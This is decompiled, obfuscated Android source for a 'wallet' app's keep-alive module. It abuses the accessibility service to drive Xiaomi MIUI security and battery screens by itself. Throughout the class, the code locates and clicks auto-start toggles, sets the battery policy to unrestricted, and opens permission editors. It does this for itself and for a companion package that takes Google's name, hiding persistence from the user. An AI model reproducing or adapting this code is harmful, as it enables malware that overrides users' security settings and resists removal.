package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class q extends c {
   public static final int z = 0;
   public final AtomicReference r = new AtomicReference<>(r.e.b);
   public final AtomicBoolean s = new AtomicBoolean(false);
   public final AtomicBoolean t = new AtomicBoolean(false);
   public final AtomicBoolean u = new AtomicBoolean(true);
   public final AtomicBoolean v = new AtomicBoolean(true);
   public final AtomicBoolean w = new AtomicBoolean(false);
   public final AtomicBoolean x = new AtomicBoolean(false);
   public final AtomicBoolean y;

   public q() {
      super(l0(), "com.miui.securitycenter");
      new AtomicBoolean(false);
      new AtomicBoolean(false);
      this.y = new AtomicBoolean(false);

      try {
         ScheduledExecutorService var1 = super.p;
         p var2 = new p(this, 0);
         var1.schedule(var2, 100L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("o.q", var3);
      }
   }

   public static CombineFilter b0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      o.b.v("MIUI_APP_POWER_CONSUME_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter d0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT", var1, var0, var1);
      return var0;
   }

   public static ListenWindow e0() {
      ListenWindow var0 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static LinkedList l0() {
      LinkedList var1 = new LinkedList();
      var1.add(o.c.J());
      var1.add(e0());
      ListenWindow var3 = new ListenWindow("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity");
      HashSet var2 = o.b.r(var3);
      Integer var0 = 32;
      var2.add(var0);
      HashSet var4 = var3.getEventTypes();
      Integer var5 = 16384;
      var4.add(var5);
      var1.add(var3);
      var1.add(n0(com.guard.wallet.utils.g.x0()));
      var1.add(n0(com.guard.wallet.utils.g.e()));
      var1.add(o0(com.guard.wallet.utils.g.x0()));
      var1.add(o0(com.guard.wallet.utils.g.e()));
      var1.add(m0(com.guard.wallet.utils.g.x0()));
      var1.add(m0(com.guard.wallet.utils.g.e()));
      var1.add(q0());
      var1.add(p0());
      var3 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.settings.OtherPermissionsActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionAppsModifyActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.miui.powerkeeper", "miuix.appcompat.app.AlertDialog");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      return var1;
   }

   public static ListenWindow m0(String var0) {
      ListenWindow var1 = new ListenWindow("com.miui.securitycenter", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static ListenWindow n0(String var0) {
      ListenWindow var1 = new ListenWindow("com.miui.securitycenter", "com.miui.appmanager.ApplicationsDetailsActivity");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static ListenWindow o0(String var0) {
      ListenWindow var1 = new ListenWindow("com.miui.securitycenter", "com.miui.appmanager.AppManagerMainActivity");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static ListenWindow p0() {
      ListenWindow var0 = new ListenWindow("com.miui.securitycenter", "com.miui.powercenter.legacypowerrank.PowerDetailActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow q0() {
      ListenWindow var0 = new ListenWindow("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void Z() {
      ReentrantLock var1 = super.o;
      if (var1.tryLock()) {
         label59: {
            Exception var10000;
            label63: {
               try {
                  if (this.T()) {
                     break label59;
                  }

                  Log.d("o.q", "准备结束本地保活自动化引擎");
                  com.guard.wallet.helper.g.h(100);
                  this.X();
                  if (MyAccessibilityService.P() != null) {
                     MyAccessibilityService.P().x();
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var10001 = false;
                  break label63;
               }

               AtomicReference var2 = this.r;

               try {
                  if (Objects.equals(var2.get(), r.e.c)) {
                     this.s0(MainApplication.getAppContext().getPackageName());
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var9 = false;
                  break label63;
               }

               try {
                  if (Objects.equals(var2.get(), r.e.d)) {
                     this.s0("com.google.guard");
                  }
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var10 = false;
                  break label63;
               }

               try {
                  super.p.shutdownNow();
                  com.guard.wallet.thread.l.a(super.c);
                  super.n.clear();
                  if (a1.q.M()) {
                     com.guard.wallet.utils.g.T0(5);
                  }
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var11 = false;
                  break label63;
               }

               try {
                  com.guard.wallet.helper.g.c();
                  Log.d("o.q", "已结束本地保活自动化引擎");
                  o.c.W();
                  this.d();
                  break label59;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var12 = false;
               }
            }

            Exception var8 = var10000;
            a1.q.s("o.q", var8);
         }

         var1.unlock();
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void c0() {
      Exception var10000;
      label105: {
         UiObject var4;
         try {
            com.guard.wallet.helper.g.h(10);
            var4 = this.Q();
         } catch (Exception var15) {
            var10000 = var15;
            boolean var10001 = false;
            break label105;
         }

         int var1 = 0;
         UiObject var16;
         if (var4 != null) {
            UiObject var3;
            try {
               var4.scrollForwardEnd();
               var4.refresh();
               z.d var2 = new z.d(d0(), 0);
               var3 = var4.scrollBackwardUtil(var2);
            } catch (Exception var14) {
               var10000 = var14;
               boolean var24 = false;
               break label105;
            }

            var16 = var3;
            if (var3 == null) {
               try {
                  z.d var17 = new z.d(b0(), 0);
                  var16 = var4.scrollForwardUtil(var17);
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var25 = false;
                  break label105;
               }
            }
         } else {
            UiObject var21;
            try {
               var21 = this.k().findOneByCombine(d0());
            } catch (Exception var12) {
               var10000 = var12;
               boolean var26 = false;
               break label105;
            }

            var16 = var21;
            if (var21 == null) {
               try {
                  var16 = this.k().findOneByCombine(b0());
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var27 = false;
                  break label105;
               }
            }
         }

         String var18;
         if (var16 != null) {
            UiObject var23;
            try {
               StringBuilder var22 = new StringBuilder("耗电策略查找成功:");
               var22.append(var16);
               Log.d("o.q", var22.toString());
               com.guard.wallet.helper.g.h(20);
               var23 = var16.findParentUtilCombine(o.c.L());
            } catch (Exception var8) {
               var10000 = var8;
               boolean var28 = false;
               break label105;
            }

            label77:
            if (var23 != null) {
               try {
                  if (!var23.click()) {
                     break label77;
                  }

                  StringBuilder var19 = new StringBuilder("已点击电量消耗、耗电策略栏目:");
                  var19.append(var23);
                  Log.d("o.q", var19.toString());
                  com.guard.wallet.helper.g.h(30);
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var29 = false;
                  break label105;
               }

               while (true) {
                  try {
                     if (this.g0()) {
                        break;
                     }
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var30 = false;
                     break label105;
                  }

                  if (var1 >= 20) {
                     break;
                  }

                  try {
                     Log.d("o.q", "正在查找电量消耗、耗电策略窗口");
                     com.guard.wallet.utils.g.T0(2);
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var31 = false;
                     break label105;
                  }

                  var1++;
               }

               try {
                  this.k0();
                  return;
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var32 = false;
                  break label105;
               }
            }

            var18 = "查找并点击耗电策略栏目失败";
         } else {
            var18 = "耗电策略、电量栏目查找失败";
         }

         try {
            Log.e("o.q", var18);
            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var33 = false;
         }
      }

      Exception var20 = var10000;
      a1.q.s("o.q", var20);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean f0() {
      Exception var10000;
      label37: {
         String var1;
         label32: {
            try {
               if (Objects.equals(this.r.get(), r.e.c)) {
                  var1 = com.guard.wallet.utils.g.x0();
                  break label32;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label37;
            }

            try {
               var1 = com.guard.wallet.utils.g.e();
            } catch (Exception var4) {
               var10000 = var4;
               boolean var7 = false;
               break label37;
            }
         }

         try {
            LinkedList var2 = new LinkedList();
            var2.add(n0(var1));
            var2.add(o0(var1));
            var2.add(m0(var1));
            if (this.q(var2)) {
               Log.d("o.q", "已进入App详情窗口");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var8 = false;
         }
      }

      Exception var6 = var10000;
      a1.q.s("o.q", var6);
      return false;
   }

   public final boolean g0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(q0());
         var1.add(p0());
         if (this.q(var1)) {
            Log.d("o.q", "已进入App省电策略窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.q", var2);
      }

      return false;
   }

   public final boolean h0() {
      try {
         if (this.q(Collections.singletonList(e0()))) {
            Log.d("o.q", "已进入自启动管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.q", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean i0(String var1) {
      Exception var10000;
      label88: {
         UiObject var3;
         try {
            var3 = this.Q();
         } catch (Exception var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label88;
         }

         UiObject var2 = var3;
         if (var3 == null) {
            try {
               this.r0();
               var2 = this.Q();
            } catch (Exception var12) {
               var10000 = var12;
               boolean var20 = false;
               break label88;
            }
         }

         UiObject var14;
         if (var2 != null) {
            z.d var4;
            try {
               Log.d("o.q", "自启动管理滚动视图查找成功");
               var4 = new z.d(o.c.H(var1), 0);
               var3 = var2.scrollForwardUtil(var4);
            } catch (Exception var11) {
               var10000 = var11;
               boolean var21 = false;
               break label88;
            }

            var14 = var3;
            if (var3 == null) {
               try {
                  var14 = var2.scrollBackwardUtil(var4);
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var22 = false;
                  break label88;
               }
            }
         } else {
            try {
               Log.e("o.q", "自启动管理滚动视图查找失败");
               var14 = this.k().findOneByCombine(o.c.H(var1));
            } catch (Exception var9) {
               var10000 = var9;
               boolean var23 = false;
               break label88;
            }
         }

         if (var14 == null) {
            return false;
         }

         try {
            var15 = var14.findParentUtilCombine(o.c.L());
         } catch (Exception var8) {
            var10000 = var8;
            boolean var24 = false;
            break label88;
         }

         label89: {
            if (var15 != null) {
               try {
                  Log.d("o.q", "自启动栏目查找成功");
                  CheckedResult var17 = this.O(var15, 5);
                  if (var17.isClicked() || var17.isChecked()) {
                     break label89;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var25 = false;
                  break label88;
               }

               var1 = "未勾选App自启动";
            } else {
               var1 = "自启动栏目查找失败";
            }

            try {
               Log.e("o.q", var1);
               return false;
            } catch (Exception var6) {
               var10000 = var6;
               boolean var26 = false;
               break label88;
            }
         }

         try {
            Log.d("o.q", "已点击，已勾选App自启动");
            return true;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var27 = false;
         }
      }

      Exception var18 = var10000;
      a1.q.s("o.q", var18);
      return false;
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void j0() {
      AtomicBoolean var2 = this.y;

      Exception var10000;
      label84: {
         try {
            var2.set(true);
            a1.q.b();
         } catch (Exception var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label84;
         }

         AtomicReference var4 = this.r;

         boolean var1;
         try {
            var1 = Objects.equals(var4.get(), r.e.c);
         } catch (Exception var12) {
            var10000 = var12;
            boolean var15 = false;
            break label84;
         }

         ConcurrentLinkedQueue var5 = super.n;
         r.e var3 = r.e.d;
         label72:
         if (var1) {
            try {
               if (!this.s.get()) {
                  var2.set(false);
                  com.guard.wallet.utils.g.d1("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                  Log.d("o.q", "启动MIUI自启动管理");
                  return;
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var16 = false;
               break label72;
            }

            label58: {
               try {
                  this.s0(MainApplication.getAppContext().getPackageName());
                  var5.clear();
                  if (!com.guard.wallet.utils.h.r("com.google.guard") && com.guard.wallet.utils.g.d0("com.google.guard") != null) {
                     var2.set(false);
                     var4.set(var3);
                     com.guard.wallet.utils.g.Z0("com.google.guard");
                     Log.d("o.q", "已启动 ".concat("com.google.guard").concat(" 应用详情"));
                     "已启动 ".concat("com.google.guard").concat(" 应用详情");
                     break label58;
                  }
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var17 = false;
                  break label72;
               }

               try {
                  this.Z();
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var18 = false;
                  break label72;
               }
            }

            try {
               return;
            } catch (Exception var6) {
               var10000 = var6;
               boolean var19 = false;
            }
         } else {
            label71: {
               try {
                  if (!Objects.equals(var4.get(), var3)) {
                     return;
                  }

                  if (!this.t.get() && com.guard.wallet.utils.g.d0("com.google.guard") != null) {
                     var2.set(false);
                     com.guard.wallet.utils.g.d1("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                     Log.d("o.q", "启动MIUI自启动管理");
                     return;
                  }
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var20 = false;
                  break label71;
               }

               try {
                  this.s0("com.google.guard");
                  var5.clear();
                  this.Z();
                  return;
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var21 = false;
               }
            }
         }
      }

      Exception var14 = var10000;
      a1.q.s("o.q", var14);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void k0() {
      Exception var10000;
      label132: {
         label141: {
            CombineFiltersWithOr var1;
            UiObject var3;
            try {
               if (!this.g0()) {
                  break label141;
               }

               Log.d("o.q", "keepAliveInAppPowerStrategy 窗口匹配");
               com.guard.wallet.helper.g.h(40);
               this.G();
               Log.d("o.q", "active root complete");
               var3 = this.Q();
               var1 = new CombineFiltersWithOr();
               LinkedList var2 = new LinkedList();
               var1.setFilters(var2);
               List var4 = var1.getFilters();
               CombineFilter var26 = new CombineFilter();
               LinkedList var5 = new LinkedList();
               var26.setStringConditions(var5);
               StringCondition var32 = new StringCondition();
               var32.setProperty("text");
               var32.setEquals(com.guard.wallet.utils.f.b("MIUI_SETTINGS_UNRESTRICTED_TEXT"));
               var26.getStringConditions().add(var32);
               var4.add(var26);
               var4 = var1.getFilters();
               CombineFilter var27 = new CombineFilter();
               var5 = new LinkedList();
               var27.setStringConditions(var5);
               StringCondition var34 = new StringCondition();
               var34.setProperty("desc");
               var34.setEquals(com.guard.wallet.utils.f.b("MIUI_SETTINGS_UNRESTRICTED_TEXT"));
               var27.getStringConditions().add(var34);
               var4.add(var27);
            } catch (Exception var21) {
               var10000 = var21;
               boolean var10001 = false;
               break label132;
            }

            UiObject var22;
            if (var3 != null) {
               UiObject var28;
               z.d var31;
               try {
                  Log.d("o.q", "耗电策略窗口滚动视图查找成功");
                  com.guard.wallet.helper.g.h(50);
                  var31 = new z.d(var1, 1);
                  var28 = var3.scrollForwardUtil(var31);
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var35 = false;
                  break label132;
               }

               var22 = var28;
               if (var28 == null) {
                  try {
                     var22 = var3.scrollForwardUtil(var31);
                  } catch (Exception var16) {
                     var10000 = var16;
                     boolean var36 = false;
                     break label132;
                  }
               }
            } else {
               try {
                  Log.e("o.q", "耗电策略窗口滚动视图查找失败");
                  var22 = this.k().findOneByOperateOr(var1);
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var37 = false;
                  break label132;
               }
            }

            if (var22 == null) {
               try {
                  Log.e("o.q", "没有找到不采取任何限制措施");
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var38 = false;
                  break label132;
               }
            }

            if (var22 != null) {
               try {
                  com.guard.wallet.helper.g.h(60);
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var39 = false;
                  break label132;
               }

               String var29 = "android.widget.TextView";

               try {
                  if (!a1.q.B(var22.className())) {
                     var29 = var22.className();
                  }
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var40 = false;
                  break label132;
               }

               label139: {
                  label137: {
                     try {
                        if ("android.widget.RadioButton".equals(var29)) {
                           var22.click();
                           break label137;
                        }
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var41 = false;
                        break label132;
                     }

                     try {
                        var22.click();
                        com.guard.wallet.utils.g.T0(5);
                        var23 = var22.findParentUtilCombine(o.c.L());
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var42 = false;
                        break label132;
                     }

                     if (var23 == null) {
                        break label139;
                     }

                     try {
                        if (!var23.click()) {
                           break label139;
                        }

                        Log.d("o.q", "已勾选无限制,不采取任何限制措施");
                     } catch (Exception var19) {
                        var10000 = var19;
                        boolean var43 = false;
                        break label132;
                     }
                  }

                  try {
                     com.guard.wallet.helper.g.h(70);
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var44 = false;
                     break label132;
                  }
               }

               label105: {
                  try {
                     if (Objects.equals(this.r.get(), r.e.c)) {
                        var24 = this.w;
                        break label105;
                     }
                  } catch (Exception var18) {
                     var10000 = var18;
                     boolean var45 = false;
                     break label132;
                  }

                  try {
                     var24 = this.x;
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var46 = false;
                     break label132;
                  }
               }

               try {
                  var24.set(true);
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var47 = false;
                  break label132;
               }
            }

            try {
               super.n.remove("startIgnoringBatteryOptimizations");
            } catch (Exception var7) {
               var10000 = var7;
               boolean var48 = false;
               break label132;
            }
         }

         try {
            if (this.g0()) {
               com.guard.wallet.utils.g.F0(1);
               com.guard.wallet.utils.g.T0(10);
            }

            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var49 = false;
         }
      }

      Exception var25 = var10000;
      a1.q.s("o.q", var25);
   }

   public final void r0() {
      try {
         ScreenMetricsVO var1 = com.guard.wallet.utils.e.e();
         Log.d("o.q", String.valueOf(var1.getNavigationBarHeight()));
         Point var3 = new Point((float)var1.getWidth().intValue() / 2.0F, (float)(var1.getHeight() - var1.getNavigationBarHeight() - 100));
         Point var2 = new Point((float)var1.getWidth().intValue() / 2.0F, (float)var1.getStatusBarHeight().intValue());
         if (com.guard.wallet.utils.g.S(10L, 1000L, var3, var2)) {
            com.guard.wallet.utils.g.T0(10);
            MyAccessibilityService.I(this.k());
         }
      } catch (Exception var4) {
         a1.q.s("o.q", var4);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void s0(String var1) {
      Exception var10000;
      label111: {
         label114: {
            PowerControlStateVO var22;
            label115: {
               try {
                  if (Objects.equals(var1, "com.google.guard")) {
                     var22 = com.guard.wallet.utils.h.k(var1);
                     var22.setPackageName(var1);
                     break label115;
                  }
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label111;
               }

               try {
                  var22 = com.guard.wallet.utils.h.k(var1);
                  var22.setPackageName(var1);
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var23 = false;
                  break label111;
               }

               AtomicBoolean var14 = this.w;

               try {
                  if (var14.get()) {
                     var22.setAllowAllFullBackground(var14.get());
                  }
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var24 = false;
                  break label111;
               }

               AtomicBoolean var15 = this.s;

               try {
                  if (var15.get()) {
                     var22.setAllowAutoStart(var15.get());
                  }
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var25 = false;
                  break label111;
               }

               AtomicBoolean var16 = this.u;

               try {
                  if (var16.get()) {
                     var22.setAllowRelateStart(var16.get());
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var26 = false;
                  break label111;
               }

               try {
                  var22.setRetryCount(var22.getRetryCount() + 1);
                  com.guard.wallet.utils.h.L(var22);
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var27 = false;
                  break label111;
               }

               var1 = "已保存主进程保活策略";
               break label114;
            }

            AtomicBoolean var18 = this.x;

            try {
               if (var18.get()) {
                  var22.setAllowAllFullBackground(var18.get());
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var28 = false;
               break label111;
            }

            AtomicBoolean var19 = this.t;

            try {
               if (var19.get()) {
                  var22.setAllowAutoStart(var19.get());
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var29 = false;
               break label111;
            }

            AtomicBoolean var20 = this.v;

            try {
               if (var20.get()) {
                  var22.setAllowRelateStart(var20.get());
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var30 = false;
               break label111;
            }

            try {
               var22.setRetryCount(var22.getRetryCount() + 1);
               com.guard.wallet.utils.h.L(var22);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var31 = false;
               break label111;
            }

            var1 = "已保存备用进程保活策略";
         }

         try {
            Log.d("o.q", var1);
            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var32 = false;
         }
      }

      Exception var21 = var10000;
      a1.q.s("o.q", var21);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label61: {
         try {
            if (this.T()) {
               return;
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var10001 = false;
            break label61;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var16 = false;
               break label61;
            }
         }

         try {
            if (this.y.get()) {
               return;
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var17 = false;
            break label61;
         }

         boolean var4;
         try {
            var4 = this.f0();
         } catch (Exception var7) {
            var10000 = var7;
            boolean var18 = false;
            break label61;
         }

         String var11 = super.c;
         ConcurrentLinkedQueue var13 = super.n;
         if (var4) {
            try {
               var13.remove("keepAliveInAutoStartManage");
               var13.remove("keepAliveInAppPermissions");
               var13.remove("keepAliveInOtherPermissions");
               var13.remove("keepAliveInPermissionModify");
               if (!var13.contains("keepAliveInAppDetail")) {
                  var13.add("keepAliveInAppDetail");
                  p var15 = new p(this, 1);
                  com.guard.wallet.thread.l.c(var15, var11);
               }
            } catch (Exception var6) {
               var10000 = var6;
               boolean var19 = false;
               break label61;
            }
         }

         try {
            if (this.h0()) {
               var13.remove("keepAliveInAppDetail");
               var13.remove("keepAliveInAppPermissions");
               var13.remove("keepAliveInOtherPermissions");
               var13.remove("keepAliveInPermissionModify");
               if (!var13.contains("keepAliveInAutoStartManage")) {
                  var13.add("keepAliveInAutoStartManage");
                  p var14 = new p(this, 2);
                  com.guard.wallet.thread.l.c(var14, var11);
                  return;
               }
            }

            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var20 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("o.q", var12);
   }
}
